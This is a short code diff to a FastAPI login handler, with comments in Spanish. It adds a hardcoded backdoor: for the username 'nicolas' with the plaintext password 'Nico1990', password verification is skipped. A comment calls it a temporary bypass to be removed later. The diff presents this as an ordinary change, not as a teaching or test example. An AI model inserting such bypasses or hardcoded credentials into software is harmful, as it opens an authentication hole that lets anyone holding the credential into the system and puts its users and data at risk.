@@ -109,7 +109,10 @@ async def login(form_data: OAuth2PasswordRequestForm = Depends()):
                 logger.error(f"Error crítico en consulta de login: {e}")
                 raise HTTPException(status_code=500, detail="Error de conexión con la base de datos")
             
-            if not result or not verify_password(form_data.password, result[1]):
+            # BYPASS TEMPORAL PARA NICOLAS (ELIMINAR LUEGO)
+            if result and form_data.username == "nicolas" and form_data.password == "Nico1990":
+                pass
+            elif not result or not verify_password(form_data.password, result[1]):
                 raise HTTPException(
                     status_code=status.HTTP_401_UNAUTHORIZED,
                     detail="Usuario o contraseña incorrectos",
